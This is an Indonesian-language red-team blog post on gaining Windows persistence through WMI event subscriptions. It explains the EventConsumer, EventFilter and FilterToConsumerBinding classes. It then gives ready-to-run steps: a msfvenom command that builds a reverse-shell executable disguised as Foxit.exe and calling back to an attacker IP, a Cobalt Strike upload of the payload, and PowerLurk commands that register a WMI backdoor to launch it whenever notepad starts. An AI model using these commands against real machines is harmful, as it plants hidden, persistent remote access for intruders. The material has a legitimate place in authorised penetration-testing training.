---
title: 'Persistence via WMI Event Subscriptions'
date: 2023-07-26 11:31:22 +0700
categories: ['Windows Hacking', 'Windows Persistence']
tags: [red team, persistence, windows hacking, windows persistence, wmi exploit]     # TAG names should always be lowercase
author: nairpaa
---

Persistensi melalui event WMI dapat dicapai dengan memanfaatkan tiga kelas berikut:
- EventConsumer
- EventFilter
- FilterToConsumerBinding

`EventConsumer` adalah tindakan yang ingin kita lakukan, yaitu untuk menjalankan *payload*. Tindakan ini bisa berupa perintah OS (seperti satu baris perintah PowerShell) atau VBScript. Dalam konteks ini, kita ingin melakukan sesuatu (eksekusi *payload*) saat suatu *trigger* terjadi.

`EventFilter` dapat kita manfaatkan untuk menentukan *trigger* tindakan (`EventConsumer`). Pemicu ini dapat berupa *arbitrary WMI query*. Beberapa contoh *trigger* bisa termasuk ketika suatu proses tertentu dimulai, ketika seorang pengguna *login*, ketika perangkat USB dimasukkan atau pada interval waktu tertentu.

`FilterToConsumerBinding` adalah yang menghubungkan `EventConsumer` dan `EventFilter`.

## 0x1 - Exploitation Stages

### Step 1: Create Malware and Upload

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```bash
# Contoh upload file pada Cobalt Strike
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
```

### Step 2: Add Malware to WMI

[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) adalah *tool* PowerShell untuk membuat event WMI. Dalam contoh ini, kita akan membuat WMI untuk mengeksekusi *malware* setiap kali `notepad` dijalankan.

```bash
PS > . .\PowerLurk.ps1
PS > Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

```powershell
# Melihat backdoor WMI
PS > Get-WmiEvent -Name WmiBackdoor
# Menghapus backdoor
PS > Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

---

## 0x2 - References

- https://github.com/Sw4mpf0x/PowerLurk
- https://pentestarmoury.com/2016/07/13/151/